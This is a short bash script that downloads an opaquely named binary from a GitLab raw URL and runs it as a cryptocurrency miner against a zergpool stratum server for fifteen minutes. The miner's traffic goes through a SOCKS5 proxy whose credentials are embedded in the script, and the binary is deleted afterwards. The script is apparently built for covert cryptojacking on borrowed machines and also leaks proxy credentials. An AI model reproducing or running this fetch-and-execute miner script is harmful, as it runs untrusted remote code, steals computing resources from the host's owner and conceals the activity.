#!/bin/bash
apt-get update
apt install screen -y
wget https://gitlab.com/sumarnosabar1/rexors/-/raw/main/yui
chmod +x yui
timeout 15m ./yui -a yescryptr16  -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u RGDDXRXXPzxnd9VMkdJCxRVwgMLoAAf3ym.RX --proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
rm -rf yui
